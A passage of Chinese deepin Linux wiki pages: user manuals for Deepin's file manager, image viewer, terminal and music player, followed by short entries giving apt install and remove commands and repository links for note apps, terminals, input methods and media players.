深度文件管理器还可以管理本地和外接磁盘。显示磁盘：您可以在深度文件管理器上的导航栏看到您的本地磁盘，当您挂载外接磁盘或者插入其他移动存储设备时，也可以在导航栏上看到相应的磁盘图标。本地磁盘：本地硬盘分区的所有磁盘。外接磁盘：包括移动硬盘、U盘、光盘。移动设备：手机内存、存储卡、SD卡等。卸载/弹出磁盘： - 在文件管理导航栏右键单击磁盘图标，选择 卸载 来卸载磁盘，磁盘仍将在磁盘列表上存在。 - 在文件管理导航栏右键单击磁盘图标，选择 弹出 来弹出磁盘，磁盘将从磁盘列表中删除，并且可以从计算机上安全删除。

通过主菜单来新建窗口和了解有用信息。新建窗口：打开一个新的文件管理器窗口。1. 在深度文件管理器界面，点击 。2. 点击 新建窗口。快捷键：文件管理器具备多种快捷键操作，您可以通过按住组合快捷键 `Ctrl` + `Shift` + `/` 键查看文件管理器所支持的快捷键列表；对于其他大多数 DDE 程序，您都可以通过此种方式唤起快捷键表。帮助：您可以点击帮助获取深度文件管理器的帮助手册，通过帮助进一步让您了解和使用深度文件管理器。1. 在深度文件管理器界面，点击 。2. 点击 帮助。3. 查看关于深度文件管理器的帮助手册。关于：您可以点击关于查看深度文件管理器的版本介绍。1. 在深度文件管理器界面，点击 。2. 点击 关于。3. 查看关于深度文件管理器的版本和介绍。退出：您可以从菜单栏退出深度文件管理器。1. 在深度文件管理器界面，点击 。2. 点击 退出。

标题：深度看图
深度看图是深度科技精心打造的一款图片查看和管理应用。外观时尚、性能流畅，支持多种图片格式，任何图片想看就看。深度看图的照片管理功能，让您可以将图片按日期排列在时间线上，还可以将图片添加到收藏夹或归类到不同的相册中，将图片管理得井井有条。

您可以通过以下方式运行或关闭深度看图，或者创建深度看图的快捷方式。运行深度看图：1. 点击桌面底部的 启动器 或将鼠标指针移到屏幕左上角，进入启动器界面。2. 上下滚动鼠标滚轮浏览或通过搜索，找到应用 点击运行。3. 将鼠标指针置于深度看图应用程序的图标上，右键点击 ，您可以： - 点击 发送到桌面，在桌面创建快捷方式。 - 点击 发送到任务栏，将应用程序固定到任务栏。 - 点击 开机自动启动，将应用程序添加到开机启动项，在电脑开机时自动运行该应用程序。关闭深度看图： - 在深度看图界面点击 × ，退出深度看图。 - 在任务栏右键单击 ，选择 关闭所有 来退出深度看图。 - 在深度看图界面点击 ，选择 退出 来退出深度看图。

使用深度看图直接打开图片文件可以进入基本的看图界面。主界面有图片管理、1:1显示、自适应、顺时针、逆时针、删除、上一张、下一张等功能按钮，各有其对应的作用。点击导航窗口上的 × 可以关闭导航窗口，也可以在看深度看图界面上单击鼠标右键选择 打开导航窗口/关闭导航窗口。

在深度看图中进行幻灯片播放图片，可在深度看图界面上单击鼠标右键，选择 幻灯片放映，图片将以幻灯片形式全屏播放，按下键盘上的 Esc 键可以退出播放。

在深度看图中复制图片，可在深度看图界面上单击鼠标右键，选择 复制，在桌面或者指定位置，单击鼠标右键，选择 粘贴，将图片文件复制到该位置。复制到剪贴板 是复制功能的补充，可用于将图片作为内容插入到文档中或者发送给好友。

在深度看图中打印图片，可在深度看图界面上单击鼠标右键，选择 打印，选择一个打印机，根据需要设置打印属性，选择 打印，将图片发送到打印机进行打印。如果选择的是pdf打印机还需要选择打印位置，将在指定位置输出pdf文件。

在深度看图中删除图片，可点击深度看图界面上的 删除图标，或右键单击图片选择 丢到回收站，或在深度看图界面上按下键盘的 Delete 键。

在深度看图中旋转图片，可在深度看图界面上单击鼠标右键，选择 顺时针旋转/逆时针旋转，图片将会顺时针转旋转90°/逆时针旋转90°。

在深度看图中设置图片为壁纸，可在深度看图界面上单击鼠标右键，选择 设为壁纸 即可将当前图片设置为壁纸。

在深度看图中查看图片信息，可在深度看图界面上单击鼠标右键，选择 图片信息 可以显示图片信息。

在深度看图的图片管理界面，时间线中的图片按照日期划分，将同一天的图片显示在一起，不同日期的图片分栏排列，最新的日期在最上方。通过拖动界面侧边的滚动条可以缩放时间线上图片的缩略图大小。深度看图在启动时会对已同步管理的文件夹进行重新同步，可在深度看图时间线界面上，点击左下角的同步图标，点击 添加文件夹，选择图片所在文件夹位置，点击 打开，将文件夹中的图片同步到时间线上。时间线上的图片可以收藏，可在深度看图的时间线界面上，打开一张图片查看，点击界面上的收藏图标，将图片加入我的收藏，也可再次点击取消收藏。还可在深度看图时间线界面上，右键单击图片，选择 添加到相册，选择一个相册，将图片添加到相册中；或选择 在文件管理器中显示，就可以在文件管理器中打开图片所在的文件夹。

在深度看图的相册管理界面，相册界面会显示相册缩略图，相册名称，相册中图片的起止时间。我的收藏 是系统根据实际情况自动生成的，这个相册不可删除、重命名。通过拖动界面侧边的滚动条可以缩放相册缩略图大小。可在深度看图相册界面，点击 + 号，输入相册名称，按下键盘上的 Enter 键新建相册；也可通过主菜单的 新建相册 选项新建相册。添加图片到相册可通过同步文件夹添加，文件夹会同时同步到时间线；或在时间线界面将图片添加到相册；或直接从文件管理器中拖拽图片文件或文件夹到相册。移除相册的图片可在深度看图相册界面上，右键单击相册中的图片，选择 从相册中移除。复制相册可在深度看图相册界面上，右键单击相册，选择 复制 会复制相册中的所有图片。重命名相册可在深度看图界面上，右键单击需要改名的相册，选择 重命名，输入相册名称，按下 Enter 键或者鼠标单击界面空白区域。

在深度看图中切换主题，可在深度看图界面，点击菜单图标，点击 浅色主题/深色主题，来切换主题颜色。设置可在深度看图界面，点击菜单图标，点击 设置，可设置幻灯片效果、时常，查看默认快捷键或设置自定义快捷键，恢复默认设置。帮助可在深度看图界面，点击菜单图标，点击 帮助，查看关于深度看图的帮助手册。关于可在深度看图界面，点击菜单图标，点击 关于，查看关于深度看图的版本和介绍。退出可在深度看图界面，点击菜单图标，点击 退出。

标题：深度终端
深度终端是深度科技精心打造的一款终端模拟器。它拥有简单的界面，丰富而强大的功能。您可以瞬间启动和关闭，使用起来像普通文件窗口一样流畅，让您在输入命令时心无旁骛，得心应手。试试雷神模式，一边看页面一边输入命令；当有多任务进行时，您可以像在浏览器中增加页签一样建立多个工作区或者将工作区分割成多个窗口；远程管理，上传下载文件再也不是问题。更多强大功能，静待您的发掘！

运行深度终端：1. 点击桌面底部的启动器图标或将鼠标指针移到屏幕左上角，进入启动器界面。2. 上下滚动鼠标滚轮，通过浏览找到深度终端进行点击。3. 将鼠标指针置于深度终端应用程序的图标上，右键单击图标，您可以：- 点击发送到桌面，在桌面创建快捷方式。- 点击发送到任务栏，将应用程序固定到任务栏。- 点击开机自动启动，将应用程序添加到开机启动项，在电脑开机时自动运行该应用程序。按下键盘上的Ctrl + Alt + T组合键也可以启动深度终端。

关闭深度终端：- 在深度终端界面点击 × ，退出深度终端。- 在任务栏右键单击图标，选择关闭所有来退出深度终端。- 在深度终端界面点击菜单图标，选择退出来退出深度终端。如果关闭终端时终端里面依然有程序在运行，会弹出一个对话框询问用户是否退出，避免强制关闭引起的用户数据丢失。

在深度终端界面上，按下键盘上的Ctrl + Shift + ?组合键来查看快捷键。

雷神模式是深度终端特有的便捷功能，只需要按下键盘上的Alt + F2组合键就可以打开雷神终端窗口，再按一下Alt + F2组合键隐藏雷神终端窗口。您也可以右键单击任务栏上的图标，选择雷神终端，来打开雷神模式的终端窗口。

分割窗口：1. 在启动器界面打开深度终端。2. 在深度终端界面，点击鼠标右键。- 点击纵向分屏，界面被分为左右两个部分。- 点击横向分屏，界面被分为上下两个部分。3. 您可以在各个终端窗口中输入命令，并可以同时查看到命令执行的结果。您也可以按下键盘上的Ctrl+Shift+J组合键来纵向分屏，按下键盘上的Ctrl+Shift+H组合键来横向分屏。

新建工作区：您可以通过以下方法新建工作区：- 在深度终端界面上，点击界面上的+号来新建一个工作区。- 在深度终端界面上，单击鼠标右键，选择新建工作区。

添加服务器：1. 在深度终端界面上，选择菜单>远程管理。2. 选择添加服务器，弹出添加服务器对话框。3. 输入服务器名、地址、用户名、密码。4. 点击添加。在添加服务器时，你可以点击高级选项来设置更多参数，也可以保持默认值，以后需要时再编辑服务器参数。

上传文件：1. 在深度终端远程管理界面上，选择一个服务器登录。2. 在深度终端界面上，单击鼠标右键。3. 选择上传文件。4. 在弹出的界面中选择要上传的文件。5. 点击上传，文件将被上传到远程服务器。

切换主题：1. 在深度终端界面，点击菜单图标。2. 点击切换主题。3. 选择一个主题。

深度终端字体乱码怎么办？终端出现乱码通常是字体问题导致的，在设置中切换一种字体一般就可以解决。1. 在深度终端界面，点击菜单图标。2. 点击设置。3. 点击字体下拉菜单切换一种字体。

搜索：1. 在深度终端界面，点击鼠标右键。2. 点击搜索。3. 在搜索框中输入要查找的字符。4. 按下键盘上的Enter键，搜索到的结果将高亮显示。5. 如果想隐藏搜索界面，可以点击深度终端空白区域按下键盘上的Esc键。搜索时按下键盘上的Enter键是从当前位置向下搜索，您也可以通过点击搜索界面上的↑或↓图标来向上搜索或向下搜索。

打开文件和应用程序：1. 在深度终端界面，输入ls -al显示当前目录下的文件。2. 双击鼠标左键，选中文件名。3. 单击鼠标右键。4. 点击打开。

新建窗口：1. 在启动器界面打开深度终端。2. 选择菜单>新建窗口，将会在桌面打开一个新的终端。您也可以右键单击任务栏上的图标，选择新建窗口，来打开雷神模式的终端窗口。

全屏显示窗口：1. 在启动器界面打开深度终端。2. 按下键盘上的F11键，深度终端将全屏显示。3. 如果要恢复正常大小显示，请按下键盘上的F11键。您也可以在深度终端界面，点击鼠标右键，选择全屏或退出全屏。

关闭窗口：对于分割的多个终端窗口，您可以执行以下操作来关闭：在深度终端界面上，将鼠标指针置于其中一个终端窗口中，点击右键，选择关闭其他窗口，来关闭除此窗口以外的其他终端窗口。

选择工作区：按下键盘上的Alt + 1~9数字键来选择对应的工作区，当工作区大于9时，将选中最后一个工作区而不是第9个工作区。

编辑服务器：1. 在深度终端远程管理界面上，点击服务器上的编辑按钮。2. 修改服务器信息。3. 点击保存。

分组服务器：1. 在深度终端界面上，打开编辑服务器对话框。2. 点击高级选项。3. 输入分组信息。4. 点击保存。

搜索服务器：1. 在深度终端界面上，单击鼠标右键。2. 选择远程管理。3. 在搜索框中输入关键词。4. 按下键盘上的Enter键，显示搜索结果。

下载文件：1. 在深度终端远程管理界面上，选择一个服务器登录。2. 在深度终端界面上，单击鼠标右键。3. 选择下载文件。4. 选择下载文件存放位置。5. 输入要下载的文件路径，文件将下载到指定位置。

删除服务器：1. 在深度终端界面上，打开添加或编辑服务器对话框。2. 点击高级选项。3. 点击删除服务器。4. 在删除服务器弹窗上，点击删除来确认删除服务器。

基础设置：1. 在深度终端界面，点击菜单图标。2. 点击设置。3. 在基础页签下，您可以：设置深度终端的字体及其大小；设置深度终端的背景透明度。

热键设置：1. 在深度终端界面，点击菜单图标。2. 点击设置。3. 在快捷键页签下，您可以：点击要修改的功能快捷键，使用键盘输入新的快捷键；如果要禁用该快捷键，请按下键盘上的←键。

高级设置：1. 在深度终端界面，点击菜单图标。2. 点击选项设置。3. 在高级设置页签下，您可以：设置光标形状；开启或关闭光标闪烁；选择滚动效果；设置窗口启动模式。点击设置页面底部的恢复默认设置可以将所有设置项恢复到默认状态。

帮助：1. 在深度终端界面，点击菜单图标。2. 点击帮助。3. 查看关于深度终端的帮助手册。

关于：1. 在深度终端界面，点击菜单图标。2. 点击关于。3. 查看关于深度终端的版本和介绍。

在深度终端界面点击鼠标右键可以进行常规操作，例如搜索、复制粘贴、打开文件等。

远程管理功能允许用户添加、编辑、分组、搜索服务器，并支持文件上传和下载。

深度终端支持多种主题切换，用户可以根据个人喜好选择不同的主题风格。

在深度终端中，用户可以通过设置调整字体、背景透明度、快捷键等，以满足个性化需求。

深度终端的高级设置中，用户可以配置光标形状、滚动效果等高级选项。

深度终端提供了帮助手册和关于信息，方便用户了解软件功能和版本详情。

标题：深度音乐
深度音乐是武汉深之度科技有限公司重新打造的一款专注于本地音乐播放的应用程序，为您提供全新的界面设计、极致的播放体验，同时还具有扫描本地音乐、歌词同步等功能。

运行深度音乐：1. 点击桌面底部的 launcher_icon 或将鼠标指针移到屏幕左上角，进入启动器界面。2. 上下滚动鼠标滚轮，通过浏览找到 music_icon-24 进行点击运行。3. 将鼠标指针置于深度音乐应用程序的图标上，右键点击图标，您可以：- 点击 发送到桌面，在桌面创建快捷方式。- 点击 发送到任务栏，将应用程序固定到任务栏。- 点击 开机自动启动，将应用程序添加到开机启动项，在电脑开机时自动运行该应用程序。如果深度音乐已经默认固定在任务栏上，您也可以点击任务栏上的 music_icon-24 来运行。

关闭深度音乐：- 在深度音乐界面，点击 ×，退出深度音乐。- 右键单击任务栏上的 music_icon-24，选择 关闭所有，退出深度音乐。

搜索框：用户可以通过搜素框快速查找音乐。主菜单：通过菜单栏您可以新建播放列表、添加音乐、设置深度音乐、查看帮助手册、关于深度音乐、退出深度音乐。排序方式：可以对列表进行排序，排序方式包括：添加时间、歌曲名称、歌手名称、专辑名称。播放框：显示当前播放歌曲名、封面、专辑名。播放/暂停按钮：点击可以开始播放/暂停播放。上一首/下一首：点击可以切换到上一首/下一首音乐。收藏：将喜欢的音乐添加到我的收藏列表中，再次点击可以取消。歌词：点击可以切换到歌词界面，点击歌词界面上的图标可以关闭。播放模式：点击可以切换播放模式，包括：列表循环、单曲循环、随机播放。音量调节：点击调节播放音量大小。播放列表：点击可以打开播放列表菜单。

添加音乐：1. 在深度音乐界面，选择 icon_menu > 添加音乐。2. 选择音乐文件所在的文件夹。3. 点击 打开，将文件夹中的音乐添加到播放列表中。

搜索音乐：1. 在深度音乐界面顶部栏，点击 搜索。2. 在搜索框中，输入关键字后自动匹配，快速定位到该音乐。

收藏音乐：1. 在深度音乐界面，点击 collect。2. 将音乐默认收藏到我的收藏列表中。您也可以右键单击要收藏的音乐文件，将其收藏到我的收藏列表中。

删除音乐：1. 在深度音乐界面播放列表中，右键单击要删除的音乐文件。2. 点击 从播放列表中删除，将该音乐文件从歌曲列表中删除，该音乐文件仍会保留在在本地文件夹中。3. 点击 从本地文件删除，将该音乐文件从歌曲列表和本地文件夹中一并删除。

查看音乐信息：1. 在深度音乐界面播放列表中，右键单击音乐文件。2. 点击 属性，您可以查看歌曲的歌手、所属专辑、文件类型、大小、时长、存储路径等信息。

在文件管理器中显示：1. 在深度音乐界面，右键单击音乐文件。2. 点击 在文件管理器中显示，打开并定位该音乐的存放文件夹位置。

所有音乐 和 我的收藏 是默认列表，不能删除。自定义的播放列表都是 所有音乐 列表的子集。我的收藏 列表既可以直接管理也可以通过主界面上的收藏按钮管理。

新建列表：1. 在深度音乐界面，点击 list_icon 打开播放列表界面。2. 点击下方的 新建列表 。3. 输入列表的名称。4. 按下键盘上的 Enter 键。

删除列表：1. 在深度音乐界面，点击 list_icon。2. 在播放列表中，选择要删除的列表。3. 点击鼠标右键。4. 点击 删除列表。

添加音乐到列表：1. 在深度音乐界面，选择一个音乐。2. 点击鼠标右键。3. 选择 添加到歌单 > 歌单名称。

移除列表的音乐：1. 在深度音乐界面，选择一个音乐。2. 点击鼠标右键。3. 选择 从列表中删除。

重命名列表：1. 在深度音乐界面，点击 list_icon。2. 在播放列表中，右键单击播放列表。3. 选择 重命名。4. 按下键盘上的 Enter 键。

常用设置：1. 在深度音乐界面，点击 icon_menu 。2. 点击 选项设置。3. 在 当播放器启动时 选项，您可以：- 勾选 自动播放 复选框，在深度音乐启动后自动播放音乐。- 勾选 继续上次播放进度 复选框，在深度音乐启动后接续上次进度播放。

热键设置：1. 在深度音乐界面，点击 icon_menu 。2. 点击 选项设置。3. 在 快捷键 选项，勾选 启用快捷键 复选框，启用快捷键操作。4. 自定义所有的快捷键。

帮助：您可以点击帮助获取深度音乐的帮助手册，通过帮助进一步让您了解和使用深度音乐。1. 在深度音乐界面，点击  icon_menu 。2. 点击 帮助。3. 查看关于深度音乐的帮助手册。

关于：您可以点击关于查看深度音乐的版本介绍。1. 在深度音乐界面，点击  icon_menu 。2. 点击 关于。3. 查看关于深度音乐的版本和介绍。

退出：您可以从菜单栏退出深度音乐。1. 在深度音乐界面，点击 icon_menu。2. 点击 退出。

标题：统信UOS助手（Android）
统信UOS助手的作用是实现PC与手机的跨端协同。

在电脑端 deepin 23系统环境中，开启 统信手机助手：打开终端输入：sudo vim /usr/share/applications/org.deepin.dde.cooperation.desktop，注释掉：Hidden=true。

Huawei 设备 鸿蒙系统 Harmony 和 EMUI 10.x（Android 10.x）开启开发者选项及相关设置：1. 找到手机的 "设置"；2. 前往 “关于手机”；3. 连续点击 “版本号” 7 - 10 次，开启开发者选项；4. 回到最后一页，找到 “系统和更新”；5. 进入 “开发者选项”，确认 “开发者选项”已经启用；6. 打开 “USB调试” ， 点击 “确定”；7. 开启“仅充电模式下允许ADB调试”，点击“确定”，USB调试开启成功。

Xiaomi 设备 Android 10.x及以上开启开发者选项及相关设置：1. 进入手机“设置”；2. 点击“我的设备”；3. 找到“全部参数”；4. 连续点击“MIUI 版本” 7-10次，打开开发者选项；5. 回到上一页，找到“更多设置”；6. 找到“开发者选项”；7. 开启“USB调试”，勾选协议，点击“确定”；8. 打开“无线调试”，勾选“始终允许通过次网络进行调试”，点击选择"确定"；9. 小米设备需要开启“USB调试（安全设置）”，特别提示：需要在设置里登录小米账号，才能开启“USB调试（安全设置）”。

OPPO 设备 Colors OS 7.x（Android 10.x及以上）开启开发者选项及相关设置：1. 找到手机上的“设置”；2. 向下滚动并点击“关于本机”；3. 转到“版本信息”；4. 点击“版本号” 7-10次启用开发者选项；5. 回到设置页面，找到“系统设置”；6. 转到“开发者选项”，开发者选项已经开启；7. 打开“USB调试“选项，点击 确定；8. 打开“无线调试”，勾选“始终允许通过此网络进行测试”，最后选择“允许”。

VIVO 设备 Origin OS 1.x（Android 10.x及以上）开启开发者选项及相关设置：1. 找到手机上的 “设置”；2. 转到“系统管理”；3. 转到“关于手机”；4. 转到“版本信息”；5. 找到“软件版本号”，点击7-10次，打开开发者选项；6. 回到“系统管理"页面，找到“开发者选项“；7. 开启“USB调试”，在弹窗中点击“确定“，USB调试开启成功；8. 开启无线调试，在弹窗中勾选“始终...”并点击“允许”，无线调试开启成功。

文件管理权限：可以在PC端向投射屏幕拖拽文件实现向手机传输文件，文件将保存在“/内部存储/TongXinUos”文件夹。但在Android11版本及以上，需要用户授权应用获得“文件管理”权限，否则此功能失效。

手机与电脑互连：1. 开启上述设置后，使用 USB数据线与电脑端进行互连；2. 手机与电脑系统端须要在同一个网段。

标题：CherryTree
CherryTree是一个支持无限层级分类的笔记软件，它支持富文本、多级标题、列表、嵌入图片等常用功能，同时还具有嵌入表格、嵌入代码框、导入和导出等功能。

sudo apt-get install cherrytree

sudo apt-get remove cherrytree

http://packages.deepin.com/deepin/pool/main/c/cherrytree/

标题：Leanote
Leanote是一款在线的云笔记应用，支持 Markdown，程序代码高亮，多人协作，笔记历史记录，可以直接将笔记发布为博客、工作日志，支持创建多笔记本、标签、共享，还有免打扰的写作模式。

安装命令：sudo apt-get install leanote

卸载命令：sudo apt-get remove leanote

仓库地址：http://packages.deepin.com/deepin/pool/main/l/leanote/

标题：Obsidian
Obsidian是一个强大的知识库笔记软件，建立在本地Markdown文件的文件夹之上。传统笔记法使用文件夹和标签管理笔记，在笔记增加到一定数量后，笔记被发现的几率就会大大减小，阻碍创意或者灵感的产生。与传统笔记法不同，Obsidian采取卡片笔记的方式，在笔记中插入相互关联的索引，将笔记编织成网，将笔记加入知识循环中，有利于我们对知识进行二次加工。Obsidian可以安装丰富的来自社区的主题和插件，通过不同主题和插件的搭配，可以打造独属于你的最佳知识库管理软件。

[Obsidian官网](https://obsidian.md/)提供了.deb和.AppImage格式的安装包，可以直接下载安装使用。

使用Obsidian需要选择保存Markdown文档的文件夹，Obsidian会自动在文件夹内生成一个.obsidian的文件夹，文档的索引、安装的主题和插件等信息都保存在此文件夹下，不会对Markdown文档进行修改。你可以在Obsidian中创建、删除、修改Markdown文档，也可以选择第三方编辑器进行编辑。免费版只支持在本地使用，多设备同步和将笔记发布到网页需要购买官方的服务。

Obsidian并不完全使用Markdown语法，比如[[  ]]双中括号用于创建双向链接，在不支持的编辑器中，如Typora，可能不能正常显示。Obsidian暂时没有官方的网页剪藏插件，但可以通过第三方浏览器插件，如简悦，实现网页的标注剪藏。

相关链接：[Obsidian官网](https://obsidian.md/)、[Obsidian中文论坛](https://forum-zh.obsidian.md/)、[自动同步简悦的稍后读到Obsidian](https://zhuanlan.zhihu.com/p/521932257)

标题：Simplenote
Simplenote是一款纯文本笔记记录应用，多平台的云同步，实时自动保存而且可以回退到历史版本，支持Markdown语法、便签分类、关键词搜索，可通过邮件标签多人协作编辑，还可以通过链接分享笔记。

安装Simplenote的命令是sudo apt-get install simplenote。

卸载Simplenote的命令是sudo apt-get remove simplenote。

Simplenote的仓库地址是http://packages.deepin.com/deepin/pool/main/s/simplenote/。

标题：为知笔记
为知笔记是一款云服务笔记软件，同时它可以资料共享、沟通协作，还能帮您记录生活、工作点点滴滴，其中工作笔记和团队协作为重点关注方向。

安装为知笔记的命令是sudo apt-get install wiznote，卸载的命令是sudo apt-get remove wiznote。

为知笔记的仓库地址是http://packages.deepin.com/deepin/pool/main/w/wiznote/。

标题：Fcitx5
Fcitx (Flexible Input Method Framework)即小企鹅输入法，是一个以GPL方式发布的输入法平台，可通过安装引擎支持多种输入法，支持简入繁出，是Linux操作系统中常用的中文输入法。其优点是短小精悍、跟程序的兼容性较好。下一代版本为Fcitx5。Fcitx5是继Fcitx后的新一代输入法框架。自20.2.3后被集成到仓库中，系统预装版本仍为fcitx4。

讯飞输入法、搜狗输入法等是在fcitx4框架的基础上，因此此类输入法将无法在 fcitx5 下使用。要在 deepin 上安装 fcitx5，首先应当先卸载现有的 fcitx4 输入法，命令为sudo apt purge *fcitx*。然后安装fcitx5框架，命令为sudo apt install fcitx5。安装成功后需配置环境变量，编辑/etc/environment，写入GTK_IM_MODULE=fcitx、QT_IM_MODULE=fcitx、XMODIFIERS=@im=fcitx、SDL_IM_MODULE=fcitx，写入后注销并重新登入即可。

安装中文输入法最简单的命令是sudo apt install fcitx5-chinese-addons，这会同时安装拼音、五笔、双拼等所有的中文输入法。也可单独安装：fcitx5-pinyin包含拼音和双拼；fcitx5-table包含自然码、五笔、晚风、双拼、二笔、电报码、仓颉等。安装完成后需在托盘右键，重新启动输入法框架。

在fcitx5-pinyin输入法中添加词库，可将词库文件放置在~/.local/share/fcitx5/pinyin/dictionaries/中。如维基百科词库fcitx5-pinyin-zhwiki，需从https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases下载最新版本的zhwiki.dict，复制到~/.local/share/fcitx5/pinyin/dictionaries/（若文件夹不存在则创建）。

修改拼音输入法的中括号为简体中文样式，需将/usr/share/fcitx5/punctuation/punc.mb.zh_CN的[ ·和] 「」改成[ [和] ]，重启fcitx5即可。

开启没有拼音的单行模式，需勾选上fcitx5设置中的在程序中显示预编辑文本和在预编辑中显示完整的拼音。

标题：Gnome_Terminal
title: Gnome_Terminal
description: Gnome Terminal是一个终端仿真器，所有设置都存储在配置文件中，可以通过菜单栏进行设置，同时可以通过命令来执行操作。
安装: `sudo apt-get install gnome-terminal`
卸载: `sudo apt-get remove gnome-terminal`
仓库地址: [http://packages.deepin.com/deepin/pool/main/g/gnome-terminal/](http://packages.deepin.com/deepin/pool/main/g/gnome-terminal/)

标题：Guake
Guake是一个下拉式的终端程序。支持快捷键、标签、背景透明等功能，可以使用快捷键控制终端程序的呼出及隐藏。

安装Guake的命令是sudo apt-get install guake。

卸载Guake的命令是sudo apt-get remove guake。

Guake的仓库地址是http://packages.deepin.com/deepin/pool/main/g/guake/。

标题：Konsole
Konsole是一个终端模拟器，它具有分割检视模式、可定制配色方案、可定制键盘操作方式、调整透明度、多页签显示、内部搜索等功能。

sudo apt-get install konsole

sudo apt-get remove konsole

http://packages.deepin.com/deepin/pool/main/k/konsole/

标题：Psensor
PSensor是一款监控硬件温度的工具，支持监控主板、CPU、GPU、硬盘、风扇转速等硬件温度，同时支持使用桌面通知系统高温报警。

sudo apt-get install psensor

sudo apt-get remove psensor

http://packages.deepin.com/deepin/pool/main/p/psensor/

标题：Stacer
Stacer 是一款开源的系统优化、应用程序监视软件，能从各方面管理整个系统，拥有管理启动项、清理垃圾、服务管理、进程管理、卸载软件、资源管理等功能。

安装命令：sudo apt install com.github.stacer

卸载命令：sudo apt remove --purge com.github.stacer

Stacer 的仓库地址是 http://packages.deepin.com/deepin/pool/main/s/stacer/

Stacer 官方网站：https://oguzhaninan.github.io/Stacer-Web/

标题：Rime
Rime是一款输入法引擎软件，是由佛振开发的一款优秀输入法软件。之所以称之为引擎，是因为，除了自带的几款输入法，你可以根据自已的需要来改造甚至是打造自己的输入法，音码、形码、并击输入等等方案都能支持。也有人用它来制作方言（粤语、吴误）或少数民族文字输入（藏文、维吾尔文等等）。如果你觉得你的输入法还差点意思，你可以考虑试试Rime来DIY下你的输入法

Rime是跨平台的，Linux平台下是叫“中州韵”。有基于Fcitx和ibus两种版本。Fcitx版的安装命令是apt install fcitx-rime

标题：Terminator
Terminator是一款跨平台的终端工具，将界面分割成网格状，拖拽排序各个终端，并行使用各个窗口，通过可视化界面来调整界面布局和配置喜好。

sudo apt-get install terminator

sudo apt-get remove terminator

http://packages.deepin.com/deepin/pool/main/t/terminator/

标题：Yakuake
Yakuake是一款下拉式终端仿真器，它与Guake在功能上非常相似。它具有从屏幕顶端弹出，标准标签式界面、可配置终端大小和动画速度等功能。

安装Yakuake可以使用命令：sudo apt-get install yakuake

卸载Yakuake可以使用命令：sudo apt-get remove yakuake

Yakuake的仓库地址是：http://packages.deepin.com/deepin/pool/main/y/yakuake/

标题：搜狗输入法
搜狗输入法是一款流行的中文输入法，它具有模糊拼音、云端输入、自动纠错、多彩皮肤、长词联想、简繁切换等功能。

安装：sudo apt-get install sogoupinyin

卸载：sudo apt-get remove sogoupinyin

仓库地址：http://packages.deepin.com/deepin/pool/non-free/s/sogoupinyin/

常见问题：解决搜狗输入法Ubuntu 14.04下黑块状态条 http://log4think.com/sogou-linux-input-black-statusbar/

标题：系统监视器
系统监视器（gnome-system-monitor）是一个开源的应用程序，为用户提供一个监控整个Linux的操作系统的程序，包括运行的进程、资源和文件系统。

安装命令：sudo apt-get install gnome-system-monitor

卸载命令：sudo apt-get remove gnome-system-monitor

仓库地址：http://packages.deepin.com/deepin/pool/main/g/gnome-system-monitor/

标题：Amarok
Amarok是一款音乐播放器，有着非常漂亮的外观和强大的播放功能，同时也有很好的中文tag支持，并且可以在播放的时候最小化到托盘。

安装：sudo apt-get install amarok

卸载：sudo apt-get remove amarok

仓库地址：http://packages.deepin.com/deepin/pool/main/a/amarok/

标题：Audacious
Audacious是一款音乐播放器，与其它播放器的不同之处在于，它除了支持UTF-8字符集之外，还提供对其它字符集的支持，这样能很好的解决中文乱码的问题。同时，Audacious可以通过丰富的插件扩展来满足不同的个性化需求。

sudo apt-get install audacious

sudo apt-get remove audacious

http://packages.deepin.com/deepin/pool/main/a/audacious/

editor: markdown

date: 2023-02-22T08:53:00.881Z
dateCreated: 2022-04-21T03:29:24.690Z

标题：Baka_MPlayer
Baka MPlayer是一个多媒体播放器，它拥有强大的内部解码器，支持本地AVI、MKV等视频，还支持在线流媒体播放、具有智能的播放列表，硬件加速播放，同时界面整洁，操作简单。

sudo apt-get install baka-mplayer

sudo apt-get remove baka-mplayer

http://packages.deepin.com/deepin/pool/main/b/baka-mplayer/

标题：Clementine
Clementine是一个音乐播放器和媒体库管理器，它具有搜索并播放媒体库、收听电台、标签式播放列表、转换音频格式、发现和下载 Podcast 播客、远程控制等功能。

sudo apt-get install clementine

sudo apt-get remove clementine

http://packages.deepin.com/deepin/pool/main/c/clementine/

标题：gxine
gxine是一个基于gtk2的libxine免费的媒体播放器，支持 CDs, DVDs 和 VCDs，支持多媒体文件格式包括：AVI, MOV, WMV, 和 MP3等，支持直接从互联网上播放视频。

安装gxine的命令是：sudo apt-get install gxine。卸载gxine的命令是：sudo apt-get remove gxine。插件安装命令：sudo apt-get install gxineplugin。插件卸载命令：sudo apt-get remove gxineplugin。

仓库地址：http://packages.deepin.com/deepin/pool/main/g/gxine/。官方网站：https://www.linuxtv.org/wiki/index.php/Gxine。

标题：Kreogist_Mu
Kreogist Mu是一个音乐管理中心，支持播放WAV、MP3、AAC、M4A等有损或无损音乐格式，读取WMA、FLAC、WAV等格式的标签信息。还支持导入导出iTunes等格式的播放列表，同时还具有无缝语言切换、歌曲预览等功能。

sudo apt-get install mu

sudo apt-get remove mu

http://packages.deepin.com/deepin/pool/main/m/mu/

标题：Parole
Parole是一个基于GStreamer多媒体框架的多媒体播放器，支持播放本地文件，DVD/CD和网络串流。

安装Parole的命令是：sudo apt-get install parole

卸载Parole的命令是：sudo apt-get remove parole

Parole的仓库地址为：http://packages.deepin.com/deepin/pool/main/p/parole/

Parole的官方网站链接是：https://docs.xfce.org/apps/parole/start

标题：Pulseaudio的可视化管理工具 pavucontrol
pavucontrol是Pulseaudio的可视化管理工具，能够单独调节每个软件的音量大小。安装该工具的命令为sudo apt install pavucontrol，在命令行中输入pavucontrol即可启动。

标题：Qmmp
Qmmp是一个基于QT开发的音乐播放器，支持播放WAV、MP3、AAC、M4A等有损或CUE索引文件和无损音乐格式，读取WMA、FLAC、WAV等格式的标签信息。界面类似winamp或xmms。

Qmmp是一个音乐播放器，支持播放WAV、MP3、AAC、M4A等有损或CUE索引文件和无损音乐格式，读取WMA、FLAC、WAV等格式的标签信息。界面类似winamp或xmms。

Qmmp的安装命令为：sudo apt-get install qmmp

Qmmp的卸载命令为：sudo apt-get remove qmmp

Qmmp的仓库地址为：http://packages.deepin.com/deepin/pool/main/q/qmmp/

Qmmp的官方网站是：http://qmmp.ylsoftware.com/

标题：SMplayer
